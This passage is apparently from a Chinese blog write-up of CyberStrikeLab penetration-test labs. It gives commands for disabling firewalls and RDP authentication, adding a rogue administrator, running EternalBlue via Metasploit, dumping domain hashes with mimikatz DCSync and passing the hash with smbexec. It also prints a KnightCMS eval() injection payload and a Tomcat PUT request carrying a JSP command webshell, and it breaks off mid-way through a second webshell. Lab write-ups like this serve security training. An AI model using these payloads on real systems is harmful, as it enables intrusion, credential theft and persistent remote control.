</span></span><span class="line"><span class="cl">netsh advfirewall firewall add rule name=&#34;SMB&#34; dir=in action=allow protocol=TCP localport=445
</span></span></code></pre></td></tr></table>
</div>
</div><p>命令解释如下：</p>
<ul>
<li><strong><code>netsh</code></strong> - Windows网络配置命令行工具</li>
<li><strong><code>advfirewall</code></strong> - 高级防火墙模块</li>
<li><strong><code>set allprofiles state off</code></strong> - 设置所有配置文件的状为关闭
<ul>
<li><code>allprofiles</code> = 所有防火墙配置文件</li>
<li><code>state off</code> = 关闭状态</li>
</ul>
</li>
</ul>
<p>然后找ai问了一下如何进行远程桌面连接</p>
<ol>
<li><strong>获取目标地址</strong>：在已获取shell的目标主机上，执行<code>ipconfig</code>命令，找到并记录下<strong>IPv4 地址</strong>。这是后续连接的关键。</li>
<li><strong>启动连接工具</strong>：在你的攻击机（通常是另一台Windows机器）上，按下<code>Win + R</code>键，输入<code>mstsc</code>，然后回车，即可打开&quot;远程桌面连接&quot;客户端。</li>
<li><strong>输入信息并连接</strong>：
<ul>
<li>在&quot;计算机&quot;栏中，填入你刚刚记录的目标主机的IP地址。</li>
<li>点击&quot;显示选项&quot;，你可以在&quot;用户名&quot;栏中预先输入拥有远程桌面连接权限的账户（例如<code>Administrator</code>）。</li>
<li>点击&quot;连接&quot;。</li>
</ul>
</li>
<li><strong>完成身份验证</strong>：
<ul>
<li>如果未保存凭据，会弹出Windows安全窗口，要求你输入密码。输入对应用户的密码。</li>
<li>首次连接时，很可能会看到一个关于远程计算机身份无法验证的证书警告。<strong>勾选&quot;不再询问&quot;</strong>，然后点击&quot;是&quot;继续连接。</li>
</ul>
</li>
<li><strong>成功登录</strong>：如果一切顺利，你就能看到并操作目标主机的远程桌面了。</li>
</ol>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130221539149.png"
	width="797"
	height="305"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130221539149_hu8979038714956587374.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130221539149_hu16297432489221356433.png 1024w"
	loading="lazy"
	
		alt="image-20251130221924545"
	
	
		class="gallery-image" 
		data-flex-grow="261"
		data-flex-basis="627px"
	
></p>
<p>然后发现身份验证错误</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130222022451.png"
	width="377"
	height="214"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130222022451_hu10004674705274673555.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130222022451_hu7555185407771829096.png 1024w"
	loading="lazy"
	
		alt="image-20251130222022451"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="422px"
	
></p>
<p>那就把身份验证也给ban了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v UserAuthentication /t REG_DWORD /d 0 /f	
</span></span></code></pre></td></tr></table>
</div>
</div><p>命令解释如下：</p>
<ul>
<li><strong><code>reg add</code></strong> - 注册表添加/修改命令</li>
<li><strong><code>&quot;HKEY_LOCAL_MACHINE\...\RDP-Tcp&quot;</code></strong> - 远程桌面TCP配置的注册表路径</li>
<li><strong><code>/v UserAuthentication</code></strong> - 指定要修改的值名称</li>
<li><strong><code>/t REG_DWORD</code></strong> - 数据类型为DWORD</li>
<li><strong><code>/d 0</code></strong> - 设置值为0（禁用）</li>
<li><strong><code>/f</code></strong> - 强制覆盖，不提示确认</li>
</ul>
<p>成功连接！！（居然是窗口的形式，第一次搞这种东西，还挺神奇的）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130222724119.png"
	width="1091"
	height="1200"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130222724119_hu15051228883007886062.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130222724119_hu17630652860754984008.png 1024w"
	loading="lazy"
	
		alt="image-20251130222724119"
	
	
		class="gallery-image" 
		data-flex-grow="90"
		data-flex-basis="218px"
	
></p>
<p>也可以在kali中进行远程连接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xfreerdp3 /u:liernian/p:123@abc /v:192.168.10.10 /drive:share,/mnt/c/Users/30589/Desktop/Test
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">这个需要下载新的包，比较麻烦
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="heading">
</h4><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1.png"
	width="582"
	height="497"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1_hu8212949964394756296.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/1_hu4790106206979168578.png 1024w"
	loading="lazy"
	
		alt="image-20251201103704208"
	
	
		class="gallery-image" 
		data-flex-grow="117"
		data-flex-basis="281px"
	
></p>
<p>然后在这里才能进行<code>fscan</code>（真是绕了一大圈啊QAQ，本来在蚁剑就可以扫）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130223333214.png"
	width="640"
	height="459"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130223333214_hu1462808441916696562.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20251130223333214_hu13312716546158664891.png 1024w"
	loading="lazy"
	
		alt="image-20251130223333214"
	
	
		class="gallery-image" 
		data-flex-grow="139"
		data-flex-basis="334px"
	
></p>
<p>扫到两个30和20分别都有永恒之蓝漏洞。</p>
<p>接下来用<code>kali</code>连接<code>openvpn</code>（进入内网环境。这一步是为了让kali的网络环境进入内网中，不然的话无法ping通）</p>
<p>其实在主机连接vpn之后重启一下虚拟机的net模式，虚拟机也可以走<code>openvpn</code>的代理</p>
<p>然后我们传<code>stowaway</code>其实<code>stowaway</code>也可以进行正向连接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">windows_x64_agent -l 8888
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">./linux_x64_admin -c 192.168.10.10:8888
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114172728899.png"
	width="745"
	height="363"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114172728899_hu5467605156838666496.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114172728899_hu8137764735750511567.png 1024w"
	loading="lazy"
	
		alt="image-20260114172728899"
	
	
		class="gallery-image" 
		data-flex-grow="205"
		data-flex-basis="492px"
	
></p>
<p>然后直接创建<code>socks</code>连接就好了，之后直接用<code>proxychains</code>打永恒之蓝就好了</p>
<p>这里打的是第三台机子，第2台机子没有<code>flag</code>，这里<code>msf</code>本来可以直接拿shell的，但是拿不到，只能执行命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 msfconsole
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">use auxiliary/admin/smb/ms17_010_command
</span></span><span class="line"><span class="cl">set RHOSTS 192.168.20.30
</span></span><span class="line"><span class="cl">set COMMAND type C:\\flag.txt
</span></span><span class="line"><span class="cl">run
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114173131807.png"
	width="827"
	height="251"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114173131807_hu2052589956394908976.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114173131807_hu9024891007258147637.png 1024w"
	loading="lazy"
	
		alt="image-20260114173131807"
	
	
		class="gallery-image" 
		data-flex-grow="329"
		data-flex-basis="790px"
	
></p>
<h3 id="flag2">flag2
</h3><h4 id="知识点pth">知识点：PTH
</h4><p>因为可以执行命令，我们直接搞个RDP</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set command net user liernian qwer123! /add
</span></span><span class="line"><span class="cl">set COMMAND net localgroup Administrators liernian /add
</span></span><span class="line"><span class="cl">set COMMAND &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;
</span></span><span class="line"><span class="cl">set command netsh firewall set opmode disable
</span></span></code></pre></td></tr></table>
</div>
</div><p>差点进入死循环，<code>openvpn</code>只能一个用户登，我主机登了，我的虚拟机就不能连接，但是通过更新<code>VM</code>的<code>net</code>连接是可以让虚拟机共享<code>openvpn</code>的。</p>
<p>然后我搞了30这个机子的<code>RDP</code>我需要主机去连，但是我主机连接了<code>openvpn</code>之后无法再连接到我的虚拟机，这就导致我主机连不上我虚拟机上搞得socks连接，也就是进不去内网，自然也无法<code>RDP</code></p>
<p>然后我想到可以用<code>kali</code>的<code>RDP</code>但是我<code>kali</code>环境有些问题，一直下不了新东西，只能在主机上下完传进<code>kali</code>。</p>
<p>woc死循环了，还好我还有一个<code>windows</code>虚拟机，在<code>windows</code>虚拟机下进行<code>RDP</code>登录</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114201641647.png"
	width="499"
	height="547"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114201641647_hu5497919925427601028.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114201641647_hu7525809791163719929.png 1024w"
	loading="lazy"
	
		alt="image-20260114201641647"
	
	
		class="gallery-image" 
		data-flex-grow="91"
		data-flex-basis="218px"
	
></p>
<p>上传<code>mimikatz</code>抓取一波哈希，之后直接打域控</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug 
</span></span><span class="line"><span class="cl">log 1.txt
</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:cyberstrikelab.com /all
</span></span></code></pre></td></tr></table>
</div>
</div><p>第一个是20那台机子的哈希，第二个是域控admin的哈希</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114203811375.png"
	width="568"
	height="135"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114203811375_hu3515929564465232259.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114203811375_hu10991404307413676102.png 1024w"
	loading="lazy"
	
		alt="image-20260114203811375"
	
	
		class="gallery-image" 
		data-flex-grow="420"
		data-flex-basis="1009px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114203941449.png"
	width="596"
	height="142"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114203941449_hu4344037888472824537.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114203941449_hu3094321342871842949.png 1024w"
	loading="lazy"
	
		alt="image-20260114203941449"
	
	
		class="gallery-image" 
		data-flex-grow="419"
		data-flex-basis="1007px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">94bd5248e87cb7f2f9b871d40c903927
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后直接打PTH登录20主机就行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 python3 smbexec.py -hashes :94bd5248e87cb7f2f9b871d40c903927 cyberstrikelab.com/administrator@192.168.20.20 
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114204341667.png"
	width="787"
	height="193"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114204341667_hu15797641646968423576.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114204341667_hu621810932792186425.png 1024w"
	loading="lazy"
	
		alt="image-20260114204341667"
	
	
		class="gallery-image" 
		data-flex-grow="407"
		data-flex-basis="978px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114204438041.png"
	width="355"
	height="56"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114204438041_hu5672214727540871525.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114204438041_hu15558396514900822693.png 1024w"
	loading="lazy"
	
		alt="image-20260114204438041"
	
	
		class="gallery-image" 
		data-flex-grow="633"
		data-flex-basis="1521px"
	
></p>
<h3 id="总结">总结
</h3><p>主要是环境搞了很久，这个靶场其实挺简单，入口一个<code>thinkphp</code>里面两台机子，两台都有永恒之蓝，不过20的利用不了，30的利用完之后抓取一下域内哈希，得到管理员的哈希之后打<code>PTH</code>就行</p>
<p>然后总结一下方式，首先进入外网靶机后，可以用<code>stowaway</code>正向连接，然后开启<code>socks</code>然后用<code>msf</code>打30的永恒之蓝（本来永恒之蓝可以拿shell的，拿到shell就可以直接抓哈希。不过这里只能执行命令）所以就搞了<code>RDP</code>抓取哈希，如果愿意传东西的话，也可以上线CS（不过我主机挂了vpn，连不到虚拟机，上线CS的话只能通过另一个虚拟机上线，上线之后抓取哈希还方便一点）</p>
<p>最后讲一下，这个靶场刚开始打的时候，我还是个小趴菜，现在过了一个月，打了几场春秋云镜之后，比之前理解的更深了。</p>
<h2 id="lab2">lab2
</h2><h3 id="flag1-1">flag1
</h3><h4 id="知识点cve-2020-35339">知识点：<code>CVE-2020-35339</code>
</h4><p>依旧<code>fscan</code></p>
<p>是一个骑士<code>cms</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114212548943.png"
	width="1690"
	height="668"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114212548943_hu2243363974003237564.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114212548943_hu10373170868157194900.png 1024w"
	loading="lazy"
	
		alt="image-20260114212548943"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="607px"
	
></p>
<p>搜索一下，发现相关<code>CVE-2020-35339</code></p>
<p>爆破弱口令<code>admin/admin123456</code></p>
<p>进行相关利用</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114213509437.png"
	width="1640"
	height="666"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114213509437_hu3060921114076049437.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114213509437_hu9644106963107579823.png 1024w"
	loading="lazy"
	
		alt="image-20260114213509437"
	
	
		class="gallery-image" 
		data-flex-grow="246"
		data-flex-basis="590px"
	
></p>
<p>额尴尬的是，打<code>phpinfo</code>之后，这个页面就全是phpinfo了，只能重开靶机，笑死我了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/.&#39;,eval($_POST[&#39;1&#39;]),&#39;/.com
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114215036244.png"
	width="1119"
	height="771"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114215036244_hu14183581667000848062.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114215036244_hu16798486096508447346.png 1024w"
	loading="lazy"
	
		alt="image-20260114215036244"
	
	
		class="gallery-image" 
		data-flex-grow="145"
		data-flex-basis="348px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114215127166.png"
	width="521"
	height="142"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114215127166_hu10129255760612984159.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114215127166_hu254431941523301551.png 1024w"
	loading="lazy"
	
		alt="image-20260114215127166"
	
	
		class="gallery-image" 
		data-flex-grow="366"
		data-flex-basis="880px"
	
></p>
<h3 id="flag2-1">flag2
</h3><h4 id="知识点tomcat任意文件写入cve-2017-12615">知识点：Tomcat任意文件写入（CVE-2017-12615）
</h4><p>直接<code>stowaway</code>正向连接。记得先开监听</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">windows_x64_agent -l 8888
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">./linux_x64_admin -c 192.168.10.10:8888
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114215848788.png"
	width="825"
	height="368"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114215848788_hu8203386500368354343.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114215848788_hu2982715877975523043.png 1024w"
	loading="lazy"
	
		alt="image-20260114215848788"
	
	
		class="gallery-image" 
		data-flex-grow="224"
		data-flex-basis="538px"
	
></p>
<p>后续发现好像10这台机子并没有内网网段，拿下就没有其他的东西了</p>
<p>那么这个stowaway就没有作用了，撤了吧</p>
<p>之前<code>fscan</code>看到<code>192.168.10.20</code>有一个tomcat服务，去看看</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114220814502.png"
	width="884"
	height="435"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114220814502_hu543167214934639369.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114220814502_hu10896812976548133478.png 1024w"
	loading="lazy"
	
		alt="image-20260114220814502"
	
	
		class="gallery-image" 
		data-flex-grow="203"
		data-flex-basis="487px"
	
></p>
<p>知道版本号，就去搜索一下有没有<code>nday</code></p>
<p>有一个PUT上传文件，直接打</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PUT /1.jsp/ HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 192.168.10.20:8080
</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">Content-Length: 460
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;%
</span></span><span class="line"><span class="cl">    String command = request.getParameter(&#34;cmd&#34;);
</span></span><span class="line"><span class="cl">    if(command != null)
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();
</span></span><span class="line"><span class="cl">        int a = -1;
</span></span><span class="line"><span class="cl">        byte[] b = new byte[2048];
</span></span><span class="line"><span class="cl">        out.print(&#34;&lt;pre&gt;&#34;);
</span></span><span class="line"><span class="cl">        while((a=in.read(b))!=-1)
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">            out.println(new String(b));
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        out.print(&#34;&lt;/pre&gt;&#34;);
</span></span><span class="line"><span class="cl">    } else {
</span></span><span class="line"><span class="cl">        out.print(&#34;format: xxx.jsp?cmd=Command&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114222017176.png"
	width="1277"
	height="800"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114222017176_hu16467930315648379396.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114222017176_hu3988063544531081906.png 1024w"
	loading="lazy"
	
		alt="image-20260114222017176"
	
	
		class="gallery-image" 
		data-flex-grow="159"
		data-flex-basis="383px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114222606647.png"
	width="715"
	height="963"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114222606647_hu11604423208169988335.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114222606647_hu12483761764056387640.png 1024w"
	loading="lazy"
	
		alt="image-20260114222606647"
	
	
		class="gallery-image" 
		data-flex-grow="74"
		data-flex-basis="178px"
	
></p>
<p>连接蚁剑发现连不上，哥斯拉也连不上</p>
<p>那就重新用哥斯拉创建一个jsp上传</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114223359447.png"
	width="1138"
	height="751"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114223359447_hu4102640640255895499.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260114223359447_hu1025312368277441917.png 1024w"
	loading="lazy"
	
		alt="image-20260114223359447"
	
	
		class="gallery-image" 
		data-flex-grow="151"
		data-flex-basis="363px"
	
></p>
<p>不断尝试后发现我之前上传的jsp都没用了，估计哥斯拉的马把环境搞炸了</p>
<p>只能重启</p>
<p>重启之后进行尝试，改用下面这个马</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="n">U</span> <span class="k">extends</span> <span class="n">ClassLoader</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">U</span><span class="p">(</span><span class="n">ClassLoader</span> <span class="n">c</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">super</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">Class</span> <span class="n">g</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">super</span><span class="o">.</span><span class="n">defineClass</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">b</span><span class="o">.</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">base64Decode</span><span class="p">(</span><span class="ne">String</span> <span class="nb">str</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.BASE64Decoder&#34;</span><span class="p">);</span>
